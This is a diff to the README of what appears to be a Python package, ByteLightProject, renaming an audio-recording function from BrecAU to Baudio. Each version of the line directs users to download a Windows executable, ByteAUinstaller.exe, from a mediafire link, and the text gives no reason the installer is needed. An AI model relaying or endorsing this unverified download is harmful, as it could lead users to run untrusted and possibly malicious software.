@@ -261,5 +261,5 @@ pip install ByteLightProject
 
  104. **`letterglue_creator(word)`**: Generates code to convert each letter of a word into variables and joins them using `letterglue`.
 
- 105. **`BrecAU("filename=audio_data", mode="Write", duration=5, Warn=True)`**: Records audio for a specified duration and saves it to a `.Bau` file, returns it or plays the audio if saved. Requires a lightweight program: [Click to download](https://www.mediafire.com/file/qxrtrpr98w53c5w/ByteAUinstaller.exe/file)
+ 105. **`Baudio("filename=audio_data", mode="Write", duration=5, Warn=True)`**: Records audio for a specified duration and saves it to a `.Bau` file, returns it or plays the audio if saved. Requires a lightweight program: [Click to download](https://www.mediafire.com/file/qxrtrpr98w53c5w/ByteAUinstaller.exe/file)
  Usage: `Baudio(filename="my_recording", mode="Write", duration=5, Warn=True)`
